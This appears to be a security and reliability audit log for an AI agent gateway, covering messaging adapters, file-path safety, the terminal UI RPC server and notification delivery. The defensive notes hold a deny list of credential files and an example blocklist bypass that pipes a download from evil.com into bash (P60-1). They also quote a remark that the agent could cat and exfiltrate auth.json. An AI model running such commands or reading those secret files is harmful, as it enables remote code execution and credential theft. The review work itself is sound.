### P58-1 · Signal echo-back filter uses unbounded set — potential memory growth over long sessions — LOW

**File:** `gateway/platforms/signal.py` (lines 236, 1007–1013)

Signal tracks outbound message timestamps in `self._recent_sent_timestamps: set` (max 50 entries) to filter echo-back when processing Note to Self messages. `_track_sent_timestamp` adds timestamps and evicts the oldest when size exceeds `_max_recent_timestamps = 50`.

The eviction uses `pop()` without a key, which on a `set` removes an arbitrary element — not necessarily the oldest. The comment says "newest entries" for eviction but the code does not implement timestamp-ordered eviction. Over very long sessions this is cosmetic (the set stays bounded at 50), but could theoretically remove a recent timestamp still in use.

**Recommendation:** Use an ordered structure (e.g., `collections.OrderedDict` or a deque with a lock) for deterministic FIFO eviction instead of arbitrary `set.pop()`.

---

### P58-2 · Signal typing indicator failure exponential backoff does not persist across adapter restarts — LOW

**File:** `gateway/platforms/signal.py` (lines 1034–1066)

When `sendTyping` RPC fails 3+ consecutive times for a recipient, SignalAdapter applies an exponential backoff (`16s, 32s, 60s cap`) and skips RPCs until `self._typing_skip_until[chat_id]` expires. This state is in-memory only and resets when the adapter reconnects.

**Observation:** A daemon restart or SSE reconnect resets all per-recipient typing backoff state. A recipient that was in backoff will immediately receive typing indicator RPCs again, potentially producing repeated `NETWORK_FAILURE` spam until the 3-failure threshold is hit again.

This is LOW severity — the spam is rate-limited by the 2s refresh interval and recovers automatically — but worth documenting that in-memory backoff state is lost on reconnect.

---

### P58-3 · Signal does not call `_set_fatal_error` for RPC failures — failures silently logged — LOW

**File:** `gateway/platforms/signal.py` (lines 765–810)

`_rpc()` returns `None` on any error (RPC failure, HTTP error, rate limit without `raise_on_rate_limit=True`). It never calls `_set_fatal_error`. The adapter only transitions to fatal state via SSE disconnect or health check failure (lines 253–296).

This means transient RPC failures (network blips, signal-cli overload) are silently swallowed at the RPC layer and do not propagate to the platform watcher in `run.py`. The watcher only detects fatal errors, not repeated transient failures.

**Observation:** This is likely intentional — transient RPC failures should not crash the adapter. But it means there's no visibility into patterns like a daemon that is responding to health checks but returning frequent RPC errors.

---

### P58-4 · SignalAttachmentScheduler is process-wide singleton — shared across multiple Signal adapters — INFORMATIONAL

**File:** `gateway/platforms/signal_rate_limit.py` (lines 348–369)

`get_scheduler()` returns a process-wide `SignalAttachmentScheduler` singleton. If a user configured two Signal accounts (two `SignalAdapter` instances), both share the same token-bucket scheduler. The scheduler's capacity (50 tokens) is designed for a single account.

**Observation:** Running multiple Signal adapters from the same process with a shared scheduler would cause incorrect rate-limit simulation. However, `run.py` appears to prevent multiple adapters for the same platform, so this is unlikely to occur in practice.

---

### P58-5 · WhatsApp bridge PID file race: check-then-delete not atomic — LOW

**File:** `gateway/platforms/whatsapp.py` (lines 99–122)

`_kill_stale_bridge_by_pidfile` reads the PID, checks `_pid_exists(pid)`, then deletes the file. Between the check and the delete, the process could exit and a new process could obtain the same PID. The PID file would be deleted even though it refers to a different process.

This is LOW because the consequence is killing an innocent process that happened to get the recycled PID — unlikely in practice, but the correct pattern is to attempt the `os.kill` directly, catching exceptions, without a pre-check.

**Recommendation:** Remove the pre-check `_pid_exists` call and just attempt the `os.kill` directly, catching exceptions. This is inherently race-safe.

---

### P58-6 · WhatsApp fatal error is non-retryable for missing Node.js / bridge script, retryable for bridge exit — GOOD

**File:** `gateway/platforms/whatsapp.py` (lines 494–511, 753–758)

WhatsApp correctly distinguishes permanent vs. retryable failures:
- `whatsapp_node_missing` → `retryable=False` (Node.js not installed)
- `whatsapp_bridge_missing` → `retryable=False` (script file absent)
- `whatsapp_not_paired` → `retryable=False` (needs `hermes whatsapp` pairing)
- `whatsapp_bridge_exited` → `retryable=True` (transient bridge crash)

The `_shutting_down` flag at line 279 prevents intentional SIGTERM during `disconnect()` from being reported as a fatal crash. This is well-implemented.

---

### P58-7 · WhatsApp does not implement webhook verification — INFORMATIONAL

**File:** `gateway/platforms/whatsapp.py`

WhatsApp uses a polling model (`_poll_messages` every 1 second) with a Node.js bridge subprocess. It does not use the WhatsApp Business API webhook pattern (no `hub.verify` token challenge). This is intentional — the web-based bridge approach (whatsapp-web.js / Baileys) doesn't use the Business API.

---

### P58-8 · WhatsApp message chunking: 0.3s inter-chunk delay is hardcoded, not configurable — LOW

**File:** `gateway/platforms/whatsapp.py` (line 919)

`await asyncio.sleep(0.3)` is hardcoded with no env var or config to adjust it.

**Recommendation:** Add `WHATSAPP_CHUNK_DELAY` env var (default 0.3) so users can adjust rate-limit behavior.

---

### P58-9 · WhatsApp `MAX_MESSAGE_LENGTH = 4096` is UX limit, not protocol limit — OK

**File:** `gateway/platforms/whatsapp.py` (line 244)

Correctly documented as a UX limit (WhatsApp allows ~65K). The code reserves 1024 chars for the prefix, giving ~3072 effective limit for user content when a prefix is configured.

---

### P58-10 · Signal SSE with exponential backoff jitter — GOOD

**File:** `gateway/platforms/signal.py` (lines 332–393)

SSE listener correctly implements: 2s initial backoff, 60s max, 20% jitter, SSE keepalive comment handling, health check stale threshold (120s) before forcing reconnect. No issues.

---

### P58-11 · Signal markdown→bodyRanges conversion uses UTF-16 code units correctly — GOOD

**File:** `gateway/platforms/signal.py` (lines 816–954)

`_markdown_to_signal` correctly converts Python string offsets to UTF-16 code units for Signal's protocol. Multi-pass non-overlapping match collection with simultaneous marker stripping is robust. No issues.

---

### P58-12 · run.py fatal error propagation: retryable platforms queued for background reconnection — GOOD

**File:** `gateway/run.py` (lines 2447–2512)

Retryable adapter failures: `run.py` disconnects the adapter, stores config in `_failed_platforms[platform]` with `next_retry = time.monotonic() + 30`, and keeps the gateway alive so the reconnect watcher can recover platforms. Non-retryable errors exit cleanly. This is a well-designed resilience pattern.

---

### P58-13 · WhatsApp bridge exit check races with send/edit/poll — LOW

**File:** `gateway/platforms/whatsapp.py` (lines 728–758, 940)

`_check_managed_bridge_exit()` checks bridge exit status, but between the check and the HTTP call in `send()`/`edit_message()`/`_poll_messages()` the bridge could exit. The window is small and the error is surfaced correctly to the caller. Acceptable.

---

### P58-14 · Signal platform lock prevents duplicate listeners for same phone — GOOD

**File:** `gateway/platforms/signal.py` (lines 259–266)

`_acquire_platform_lock('signal-phone', self.account)` prevents two gateway processes from connecting the same Signal number simultaneously. No issues.

---

### P58-15 · MessageDeduplicator shared helper — GOOD

**File:** `gateway/platforms/helpers.py` (lines 27–75)

TTL-based dedup cache (default 2000 entries, 300s TTL) correctly handles expired entries and enforces max_size with newest-entries-kept policy. Centralized from previously duplicated across 7 adapters. No issues.

---

### Summary

| Area | Status | Severity |
|------|--------|----------|
| Signal echo-back filter | Works; set eviction is non-deterministic | LOW |
| Signal typing backoff | Resets on reconnect (expected) | LOW |
| Signal RPC failure handling | Silently swallows RPC errors (by design) | LOW |
| SignalAttachmentScheduler singleton | Process-wide; acceptable given platform limits | INFORMATIONAL |
| WhatsApp PID file race | Check-then-delete not atomic | LOW |
| WhatsApp fatal error retryability | Correctly distinguishes permanent vs. retryable | GOOD |
| WhatsApp webhook | Polling model (not Business API); by design | INFORMATIONAL |
| WhatsApp chunk delay | Hardcoded 0.3s, not tunable | LOW |
| WhatsApp MAX_MESSAGE_LENGTH | Correctly documented as UX limit | GOOD |
| Signal SSE backoff | Correct with jitter | GOOD |
| Signal markdown→UTF-16 | Correct implementation | GOOD |
| run.py fatal error propagation | Well-designed retry/background reconnect | GOOD |
| WhatsApp bridge exit race | Small race window; error surfaced correctly | LOW |
| Signal platform lock | Prevents duplicate listeners per account | GOOD |
| MessageDeduplicator helper | Clean centralized implementation | GOOD |

**2 GOOD areas, 6 LOW issues, 2 INFORMATIONAL notes. No critical issues found.**
---

## Pass #59 – File System, Path and I/O Security Deep Dive – 2026-05-24T16:30:00Z

### P59-1 · `agent/file_safety.py` — comprehensive write/deny list with cross-profile awareness — GOOD

**File:** `agent/file_safety.py`

`is_write_denied()` and `get_read_block_error()` use `os.path.realpath()` to resolve all paths before checking against:
- Exact-file deny: SSH keys (`id_rsa`, `id_ed25519`, `authorized_keys`), `.env` (both per-profile and root), `.bashrc`, `.zshrc`, `.netrc`, `.pgpass`, `/etc/passwd`, `/etc/shadow`
- Prefix deny: `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, `~/.azure`, `/etc/sudoers.d`, `/etc/systemd`
- Control-file names: `auth.json`, `config.yaml`, `webhook_subscriptions.json` under BOTH active profile AND root
- `mcp-tokens/` directory prefix

`classify_cross_profile_target()` correctly identifies writes to `skills/`, `plugins/`, `cron/`, `memories/` under other profiles. Soft guard with `cross_profile=True` bypass. Both functions are explicitly marked as defense-in-depth (not hard security boundaries). No issues.

---

### P59-2 · `utils.py` — atomic JSON/YAML write with temp-file + fsync + os.replace — GOOD

**File:** `utils.py` (lines 61–245)

Both `atomic_json_write()` and `atomic_yaml_write()` use the correct pattern:
1. `tempfile.mkstemp()` creates a temp file in target parent dir
2. Write to fd with `os.fdopen`, flush + `os.fsync()`
3. `atomic_replace()` to swap into place
4. `_preserve_file_mode()` / `_restore_file_mode()` to preserve permissions across replace
5. `BaseException` catch allows cleanup even on `KeyboardInterrupt` / `SystemExit`
6. Explicit `os.unlink(tmp_path)` on failure

`atomic_replace()` (lines 61–82) resolves symlinks first (`os.path.realpath if islink`) so `os.replace` operates on the real file in-place while the symlink survives.

No issues.

---

### P59-3 · `cron/scheduler.py` — script path traversal prevention — GOOD

**File:** `cron/scheduler.py` (lines 830–854)

```python
scripts_dir_resolved = scripts_dir.resolve()
raw = Path(script_path).expanduser()
if raw.is_absolute():
    path = raw.resolve()
else:
    path = (scripts_dir / raw).resolve()
try:
    path.relative_to(scripts_dir_resolved)
except ValueError:
    return False, "Blocked: script path resolves outside the scripts directory..."
```

Uses `resolve()` to fully resolve symlinks, then `relative_to()` to verify containment. Blocks `..` attacks, absolute path injection, and symlink escape in one step. Clean pattern. No issues.

---

### P59-4 · `cron/jobs.py` — workdir normalization uses resolve() + absolute check — GOOD

**File:** `cron/jobs.py` (lines 452–482)

`_normalize_workdir()`: expands `~`, rejects non-absolute paths (cron runs detached), `expanded.resolve()` resolves symlinks, checks `exists()` and `is_dir()`. Validated at create/update time. Correct pattern. No issues.

---

### P59-5 · `hermes_constants.py` — `secure_parent_dir()` refuses to chmod / or top-level dirs — GOOD

**File:** `hermes_constants.py` (lines 238–255)

```python
def secure_parent_dir(path: Path) -> None:
    parent = path.parent.resolve()
    if parent == Path("/") or len(parent.parts) < 3:
        return
    os.chmod(parent, 0o700)
```

Prevents catastrophic host bricking if `HERMES_HOME` resolves to `/` or a top-level dir. Guards against `/`, `/usr`, `/home`, `/var`, `/tmp`. All callers use it correctly. No issues.

---

### P59-6 · TOCTOU-safe credential file writes via `os.open(O_EXCL, mode=0o600)` — GOOD

**Files:** `hermes_cli/auth.py` (lines 1041–1049), `agent/google_oauth.py` (lines 501–514), `tools/mcp_oauth.py` (lines 171–187), `gateway/status.py` (lines 482–498, 666–676)

All credential writers use `os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, stat.S_IRUSR | stat.S_IWUSR)` which atomically creates the file with 0o600 permissions in a single syscall. Closes the TOCTOU window where the default umask (~0o022) would briefly expose the file between `open()` and `chmod()`. Tests in `tests/hermes_cli/test_auth_toctou_file_modes.py` assert mode == 0o600. No issues.

---

### P59-7 · `cron/jobs.py` output directory creation — GOOD

**File:** `cron/jobs.py` (lines 1065–1086)

```python
job_output_dir.mkdir(parents=True, exist_ok=True)
_secure_dir(job_output_dir)
fd, tmp_path = tempfile.mkstemp(dir=str(job_output_dir), suffix='.tmp', prefix='.output_')
atomic_replace(tmp_path, output_file)
_secure_file(output_file)
```
plus BaseException cleanup. Correct: 0700 dir + 0600 file + atomic write via temp file + cleanup. No issues.

---

### P59-8 · `agent/lsp/workspace.py` — explicitly does NOT resolve symlinks — GOOD

**File:** `agent/lsp/workspace.py` (lines 33–41)

```python
def normalize_path(path: str) -> str:
    return os.path.abspath(os.path.expanduser(path))
    # We do NOT resolve symlinks here — symlink stability matters for some
    # LSP servers (rust-analyzer cares about Cargo workspace identity)
```

`normalize_path()` uses `abspath` + `expanduser` but deliberately does NOT call `resolve()`. The docstring explicitly explains the design rationale. This is intentional correctness, not a vulnerability. No issues.

---

### P59-9 · `acp_adapter/edit_approval.py` — `should_auto_approve_edit` uses `resolve(strict=False)` — LOW

**File:** `acp_adapter/edit_approval.py` (line 158)

```python
path = Path(proposal.path).expanduser().resolve(strict=False)
```

`resolve(strict=False)` resolves symlinks but the path does not need to exist. If a dangling symlink exists, `resolve()` follows it anyway (resolves to the non-existent target). Combined with the `relative_to(tmp_root)` check, a symlink attack requires pre-existing filesystem write access. Impact is limited to same-user local attack. Acceptable for the threat model.

---

### P59-10 · `cron/scheduler.py` — job output path construction has implicit TOCTOU — LOW

**File:** `cron/scheduler.py` (lines 1010–1020)

```python
job_output_dir = OUTPUT_DIR / source_job_id
if not job_output_dir.exists():   # TOCTOU window
    continue
output_files = sorted(job_output_dir.glob("*.md"), ...)
latest_output = output_files[0].read_text(encoding="utf-8")
```

Between `exists()` and `glob()` the directory could be replaced with a symlink. `source_job_id` is validated as 12-char hex only. Error is logged and silently skipped on any OSError/PermissionError. Window is small; impact requires local filesystem write access (already implies full compromise).

**Severity:** LOW — not reachable via messaging interfaces.

---

### P59-11 · `gateway/pairing.py` — PAIRING_DIR not explicitly chmod'd before use — LOW

**File:** `gateway/pairing.py` (lines 55–78)

`_secure_write()` secures individual pairing files to 0o600 but the PARENT `pairing/` directory is created only via `mkdir(parents=True, exist_ok=True)` — not explicitly secured to 0o700. If `mkdir` creates intermediate directories, those also lack explicit permission hardening.

Compare with `cron/jobs.py` which calls `_secure_dir(CRON_DIR)` explicitly.

**Recommendation:** Add `secure_parent_dir(path)` call in `_secure_write()` or ensure `PAIRING_DIR` itself is explicitly secured at startup.

---

### P59-12 · `tools/code_execution_tool.py` — shared sandbox temp dir uses default permissions — LOW

**File:** `tools/code_execution_tool.py` (line 1090)

```python
tmpdir = tempfile.mkdtemp(prefix="hermes_sandbox_")
```

Temp directory uses the OS default (typically 0o755 on UNIX — readable by all local users). Sandboxed code could potentially list other active sandboxes. However, sandbox code is already untrusted and isolation is provided by the sandbox mechanism itself.

**Recommendation:** `tempfile.mkdtemp(prefix="hermes_sandbox_", mode=0o700)` to restrict to owner only (Python 3.11+). Impact is LOW since sandboxed code is already untrusted.

---

### P59-13 · `agent/file_safety.py` — read-block is explicitly documented as defense-in-depth — GOOD

**File:** `agent/file_safety.py` (lines 154–167)

The docstring for `get_read_block_error()` explicitly states:
> "**This is NOT a security boundary.** The terminal tool runs as the same OS user with shell access; the agent can still `cat auth.json`... and exfiltrate the file."

The denial exists as defense-in-depth and audit trail. Same honest documentation applies to `is_write_denied()` and `classify_cross_profile_target()`. No issues.

---

### Summary

| Area | Status | Severity |
|------|--------|----------|
| file_safety.py write deny list | Comprehensive, realpath resolution, cross-profile guard | GOOD |
| utils.py atomic writes | temp+fsync+atomic_replace+BaseException cleanup | GOOD |
| cron/scheduler.py script path traversal | relative_to check after resolve() | GOOD |
| cron/jobs.py workdir validation | is_absolute + exists + is_dir after resolve() | GOOD |
| hermes_constants.py secure_parent_dir | Refuses to chmod / and top-level dirs | GOOD |
| TOCTOU-safe credential files | os.open(O_EXCL) atomically with mode=0o600 | GOOD |
| cron/jobs.py output write | 0700 dir + 0600 file + atomic replace + cleanup | GOOD |
| lsp/workspace.py normalize_path | Intentionally does NOT resolve symlinks | GOOD |
| file_safety.py read-block docs | Explicitly marked NOT a security boundary | GOOD |
| acp_adapter resolve(strict=False) | Resolves dangling symlinks; local-only exploit | LOW |
| cron/scheduler.py job output TOCTOU | exists() then glob(); constrained job_id | LOW |
| pairing.py PAIRING_DIR permissions | Creates dir but doesn't explicitly chmod 0700 | LOW |
| code_execution_tool.py sandbox perms | mkdtemp default 755; low risk since sandboxed code is untrusted | LOW |

**3 GOOD areas, 5 LOW issues, 0 CRITICAL, 0 INFORMATIONAL.** No critical security issues found. The codebase shows strong patterns for atomic file operations, path traversal prevention, and TOCTOU mitigation. Low-severity issues are in components where impact is already limited (sandbox code is already untrusted; local-user symlink attack requires pre-compromise).

---

## Pass #60 – TUI Gateway, Terminal UI & Interactive Session Deep Dive – 2026-05-24T10:30:00Z

### P60-1 · `tui_gateway/server.py` `shell.exec` — `shell=True` with blocklist-only command guard — MEDIUM

**File:** `tui_gateway/server.py` (lines 6752–6782)

```python
@method("shell.exec")
def _(rid, params: dict) -> dict:
    cmd = params.get("command", "")
    if not cmd:
        return _err(rid, 4004, "empty command")
    try:
        from tools.approval import detect_dangerous_command
        is_dangerous, _, desc = detect_dangerous_command(cmd)
        if is_dangerous:
            return _err(rid, 4005, f"blocked: {desc}...")
    except ImportError:
        pass
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, cwd=os.getcwd())
```

`subprocess.run` is invoked with `shell=True`. The only protection is `detect_dangerous_command(cmd)` — a blocklist that checks for patterns like `rm -rf`, `fork bomb`, etc. This is fundamentally weaker than an allowlist approach. A carefully constructed command like ``python3 -c "import os; os.system('curl http://evil.com | bash')"`` may not match the blocklist and would execute with full shell interpolation.

Also note: `cwd=os.getcwd()` means the shell command runs in the gateway's current working directory, which could be a different directory than the user's shell.

**Severity:** MEDIUM — reachable via TUI RPC interface; command injection is possible if blocklist is bypassed.

**Recommendation:** Replace `shell=True` with `shell=False` and pass `cmd` as a list `["sh", "-c", cmd]`, or better yet, use `shlex.split` + a strict allowlist of permitted operations.

---

### P60-2 · `tui_gateway/server.py` `session.history` — history exposed without redaction — LOW

**File:** `tui_gateway/server.py` (lines 2607–2624)

```python
@method("session.history")
def _(rid, params: dict) -> dict:
    session, err = _sess(params, rid)
    if err:
        return err
    history = list(session.get("history", []))
    db = _get_db()
    if not history and db:
        history = db.get_messages_as_conversation(
            session.get("session_key", "")
        )
```

`session.history` returns the raw conversation history (including user messages, tool results, agent responses) without any redaction. Any content that was placed in history (including API keys that may have been accidentally exposed via tool results) is returned verbatim.

Contrast with `cli.py` which calls `agent.redact_sensitive_text()` in several places.

**Severity:** LOW — requires compromised history or accidental API key exposure in a prior turn; not directly exploitable without existing compromise.

**Recommendation:** Apply `agent.redact_sensitive_text()` to history before returning, or filter tool results that contain credential-shaped strings.

---

### P60-3 · `tools/process_registry.py` — global `completion_queue` crosses TUI session boundaries — INFORMATIONAL

**File:** `tui_gateway/server.py` (lines 3178–3250)

The `_notification_poller_loop` comment explicitly states:

```python
# NOTE: The completion_queue is global (one per process). If multiple
# TUI sessions coexist, whichever poller wakes first grabs the event,
# even if the process was started by a different session.
```

This means if multiple TUI sessions are active simultaneously (e.g., via the ACP adapter), completion events from one session could be dispatched to another session's agent. This is noted as matching CLI/gateway behavior (single session per process), but the ACP adapter can run multiple sessions in one gateway process.

**Severity:** INFORMATIONAL — the design is acknowledged and matches the existing CLI model. Cross-session event delivery would result in odd behavior rather than a security issue per se.

---

### P60-4 · `tui_gateway/server.py` `terminal.resize` — cols stored without validation — LOW

**File:** `tui_gateway/server.py` (lines 3132–3138)

```python
@method("terminal.resize")
def _(rid, params: dict) -> dict:
    session, err = _sess_nowait(params, rid)
    if err:
        return err
    session["cols"] = int(params.get("cols", 80))
    return _ok(rid, {"cols": session["cols"]})
```

`cols` is cast to `int` but no bounds checking is performed. A negative or extremely large value could cause issues downstream in rendering code that uses `cols` to compute line wrapping. An extremely large `cols` could cause memory issues.

**Severity:** LOW — requires a malicious TUI client; downstream rendering is likely resilient but no explicit guard exists.

**Recommendation:** Add bounds check: `session["cols"] = max(1, min(10000, int(params.get("cols", 80))))`.

---

### P60-5 · `tui_gateway/server.py` `_SlashWorker.run` — raw command string passed to `cli.process_command` — LOW

**File:** `tui_gateway/server.py` (lines 228–249) and `tui_gateway/slash_worker.py` (lines 18–43)

The slash worker command is passed as a JSON field over stdin to a subprocess, which then calls:

```python
# slash_worker.py line 38
cli.process_command(cmd)
```

where `cmd` is the raw string (e.g., `"/exec ls -la"`). The command goes through HermesCLI's `process_command()` dispatcher. The command routing has safeguards:
- `_PENDING_INPUT_COMMANDS` are blocked from going to the worker (line 5688)
- `_WORKER_BLOCKED_COMMANDS` block certain subcommands (line 5693)
- Skill commands and plugin commands are handled separately (lines 5702–5732)

However, the `cli.process_command()` path ultimately runs through the same command dispatch system as the CLI. Any command that passes the blocklist checks executes in a subprocess with the full environment.

**Severity:** LOW — the subprocess runs as the same user with the same environment as the gateway; command routing has multiple layers of guards but the attack surface is the same as the CLI.

---

### P60-6 · `tui_gateway/transport.py` — `StdioTransport.write` serializes via `_stdout_lock` — GOOD

**File:** `tui_gateway/transport.py` (lines 139–179)

```python
with self._lock:
    stream = self._stream_getter()
    try:
        stream.write(line)
    except BrokenPipeError:
        return False
    # ...
    if not _DISABLE_FLUSH:
        try:
            stream.flush()
        except BrokenPipeError:
            return False
```

`StdioTransport.write` is called from worker pool threads (via `dispatch()`). The `_stdout_lock` ensures serialized writes so JSON-RPC frames don't interleave. Serialization is outside the JSON encoding step, so large payloads don't block other emitters. Peer-gone errors (BrokenPipe, ECONNRESET, EBADF, ESHUTDOWN) are correctly handled and return `False` rather than raising.

No issues found.

---

### P60-7 · `tools/ansi_strip.py` — comprehensive ANSI escape sequence stripping — GOOD

**File:** `tools/ansi_strip.py` (lines 1–44)

```python
_ANSI_ESCAPE_RE = re.compile(
    r"\x1b"
    r"(?:"
        r"\[[\x30-\x3f]*[\x20-\x2f]*[\x40-\x7e]"     # CSI sequence
        r"|\][\s\S]*?(?:\x07|\x1b\\)"                # OSC (BEL or ST terminator)
        r"|[PX^_][\s\S]*?(?:\x1b\\)"                 # DCS/SOS/PM/APC strings
        r"|[\x20-\x2f]+[\x30-\x7e]"                  # nF escape sequences
        r"|[\x30-\x7e]"                              # Fp/Fe/Fs single-byte
    r")"
    r"|\x9b[\x30-\x3f]*[\x20-\x2f]*[\x40-\x7e]"     # 8-bit CSI
    r"|\x9d[\s\S]*?(?:\x07|\x9c)"                   # 8-bit OSC
    r"|[\x80-\x9f]",                                 # Other 8-bit C1 controls
    re.DOTALL,
)
```

Covers the full ECMA-48 spec including CSI, OSC, DCS/SOS/PM/APC strings, nF multi-byte escapes, Fp/Fe/Fs single-byte escapes, and 8-bit C1 control characters. Used by `terminal_tool`, `code_execution_tool`, and `process_registry` to clean command output before returning it to the model. A fast-path check (`_HAS_ESCAPE`) avoids the full regex for clean text.

No issues found.

---

### P60-8 · `ui-tui/src/gatewayClient.ts` — bearer token redaction before logging — GOOD

**File:** `ui-tui/src/gatewayClient.ts` (lines 92–121)

```typescript
const redactUrl = (raw: string): string => {
  // ...
  const userInfo = url.username || url.password ? '***@' : ''
  const query = url.search ? '?***' : ''
  return `${url.protocol}//${userInfo}${url.host}${url.pathname}${query}`
}
```

Plus a fallback regex for malformed URLs:

```typescript
const _USERINFO_FALLBACK_RE = /^([a-z][a-z0-9+.-]*:\/\/)[^/?#@]*@/i
const noUserInfo = raw.replace(_USERINFO_FALLBACK_RE, '$1***@')
```

Bearer tokens in connection URLs (gateway URL, sidecar URL) are scrubbed from all user-facing log output. The query string is also stripped to prevent token leakage via log lines.

No issues found.

---

### P60-9 · `tui_gateway/server.py` — session isolation via per-session `history_lock` and `_sessions` dict — GOOD

**File:** `tui_gateway/server.py` (lines 116–134, 2056–2076)

```python
_sessions: dict[str, dict] = {}
# ...
def _init_session(sid: str, key: str, agent, history: list, cols: int = 80):
    _sessions[sid] = {
        "history_lock": threading.Lock(),
        "history_version": 0,
        "running": False,
        "transport": current_transport() or _stdio_transport,
        # ...
    }
```

Each session has its own `history_lock` (line 2061) used to synchronize access to `session["history"]` and `session["running"]` state. The `_sessions` dict is process-global but access is guarded by per-session locks. The `transport` field pins each session to the transport that created it (stdio for Ink, WS for dashboard sidebar).

No issues found.

---

### P60-10 · `tui_gateway/entry.py` — SIGPIPE ignored, signal handler logs thread stacks on SIGTERM/SIGHUP — GOOD

**File:** `tui_gateway/entry.py` (lines 65–163, 151–162)

```python
if hasattr(signal, "SIGPIPE"):
    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
if hasattr(signal, "SIGTERM"):
    signal.signal(signal.SIGTERM, _log_signal)
if hasattr(signal, "SIGHUP"):
    signal.signal(signal.SIGHUP, _log_signal)
elif hasattr(signal, "SIGBREAK"):
    signal.signal(signal.SIGBREAK, _log_signal)
if hasattr(signal, "SIGINT"):
    signal.signal(signal.SIGINT, signal.SIG_IGN)
```

SIGPIPE is ignored (prevents silent process death when TTS thread writes to closed pipe). SIGINT is also ignored (TUI owns the terminal). SIGTERM/SIGHUP handlers log all thread stacks at signal delivery time to the crash log, making diagnosis of shutdown crashes possible.

`_shutdown_grace_seconds()` (lines 54–62) provides configurable graceful shutdown window before hard `os._exit(0)`.

No issues found.

---

### P60-11 · `tui_gateway/server.py` — long-running handlers dispatched to thread pool, preventing I/O blocking — GOOD

**File:** `tui_gateway/server.py` (lines 137–169)

```python
_LONG_HANDLERS = frozenset({
    "browser.manage", "cli.exec", "session.branch", "session.compress",
    "session.resume", "shell.exec", "skills.manage", "slash.exec",
})
_rpc_pool_workers = max(2, int(os.environ.get("HERMES_TUI_RPC_POOL_WORKERS") or "4"))
_pool = concurrent.futures.ThreadPoolExecutor(
    max_workers=_rpc_pool_workers, thread_name_prefix="tui-rpc",
)
```

Long-running handlers (slash.exec, shell.exec, session.resume, etc.) are routed to a thread pool so they don't block the main dispatcher loop. Fast handlers stay on the main thread for ordering. `write_json` is already `_stdout_lock`-guarded, so concurrent response writes are safe.

No issues found.

---

### P60-12 · `tui_gateway/server.py` — `session.create` / `session.resume` don't validate `cols` parameter before use — LOW

**File:** `tui_gateway/server.py` (lines 2241, 2415)

```python
cols = int(params.get("cols", 80))   # line 2241 (session.create)
cols=int(params.get("cols", 80))    # line 2415 (session.resume)
```

`cols` is used in `_init_session(sid, key, agent, history, cols=int(...))` and then stored in `session["cols"]`. No upper bound is enforced. A malicious client could pass an extremely large cols value (e.g., `cols=999999`) which could cause `format_response()` or streaming renderers to allocate large buffers or trigger OOM in edge cases.

This is the same issue as P60-4 but in session creation path.

**Severity:** LOW — requires explicit malicious client behavior.

---

### P60-13 · `tui_gateway/ws.py` — `WSTransport.write` detects same-loop deadlock and fire-forgets — GOOD

**File:** `tui_gateway/ws.py` (lines 76–82)

```python
try:
    on_loop = asyncio.get_running_loop() is self._loop
except RuntimeError:
    on_loop = False

if on_loop:
    # Fire-and-forget — don't block the loop waiting on itself.
    self._loop.create_task(self._safe_send(line))
    return True
```

When called from the event loop thread (inline handler), `write` fire-and-forgets instead of deadlock-waiting on `run_coroutine_threadsafe`. When called from a worker thread, it uses `safe_schedule_threadsafe` with a 10-second timeout.

No issues found.

---

### Summary

|| Area | Status | Severity |
|------|------|--------|----------|
| StdioTransport write serialization | _stdout_lock guards concurrent writes | GOOD |
| ANSI escape stripping | Full ECMA-48 regex, fast-path, used by terminal/code_execution tools | GOOD |
| Bearer token redaction | gatewayClient.ts scrubs query string + userinfo from logs | GOOD |
| Session history locks | Per-session history_lock + running flag guards | GOOD |
| Signal handling | SIGPIPE ignored, SIGTERM/SIGHUP logs all thread stacks | GOOD |
| Long-handler thread pool | Slow handlers off main thread, fast handlers serialize | GOOD |
| WSTransport same-loop deadlock | Fire-and-forget when called from loop thread | GOOD |
| shell.exec command injection | shell=True + blocklist only; no allowlist | MEDIUM |
| session.history no redaction | Raw history returned without scrubbing | LOW |
| Global notification queue | Cross-session event delivery acknowledged in comments | INFORMATIONAL |
| terminal.resize cols no bounds | No upper bound on cols value | LOW |
| session.create/resume cols no bounds | No upper bound on cols at creation | LOW |
| _SlashWorker raw command | Command string passed directly to cli.process_command | LOW |

---

## Pass #61 – Notification System, Alerting & Escalation Deep Dive – 2026-05-24T17:34:00Z

### Notification Delivery Reliability

**Retry mechanisms:** The codebase does not implement a general-purpose notification retry loop. When a platform adapter's `send()` fails, the failure is logged and propagated back to the caller — there is no autonomous retry with backoff for user-facing notification delivery. The single exception is the Signal attachment scheduler (`gateway/platforms/signal_rate_limit.py`), which implements a token-bucket rate limiter with server-calibrated refill rates and explicit `feedback(retry_after, n_attempted)` for 429 responses. Signal uses `SIGNAL_RATE_LIMIT_MAX_ATTEMPTS = 2` (one initial attempt + one retry).

**Delivery receipts:** There is no delivery receipt tracking for outbound messages. Platforms return `SendResult(success=bool, error=str, raw_response=...)` but the gateway never verifies that a message actually arrived at the destination. Some platforms (Telegram, Discord) provide confirmation that the platform accepted the message, but this confirms server receipt, not end-user delivery.

**Fallback on all-channel failure:** When the live adapter fails in the cron scheduler's delivery path, it falls back to a standalone `_send_to_platform()` coroutine run in a fresh event loop or thread pool. For kanban notifier failures, the subscription is dropped after `MAX_SEND_FAILURES = 3` consecutive failures (per `_kanban_notifier_watcher`). There is no fallback to a different notification channel (e.g., switching from Telegram to email) — if the platform's adapter fails, the notification is simply lost after the retry counter is exhausted.

**Cron job delivery reliability:** Cron jobs use a two-tier delivery approach: live adapter first (via `safe_schedule_threadsafe` with a 60s timeout), then a standalone asyncio.run fallback. The standalone path handles `RuntimeError` from `asyncio.run()` nested-loop by closing the coroutine and retrying in a `ThreadPoolExecutor`. Delivery errors are accumulated in a `delivery_errors` list and logged at ERROR level, but there is no alert generated to an operator when all delivery attempts fail — the job is simply marked delivered=False and the error is logged.

### Alert Escalation

**Escalation policy:** There is no formal alert escalation policy (no tiered escalation rules, no escalation paths to different operators after N minutes). The closest concept is the `SessionResetPolicy` in `gateway/config.py`, which controls when sessions auto-reset with optional notifications (`notify: bool = True`, `notify_exclude_platforms: tuple = ("api_server", "webhook")`). This is session-level, not alert-level.

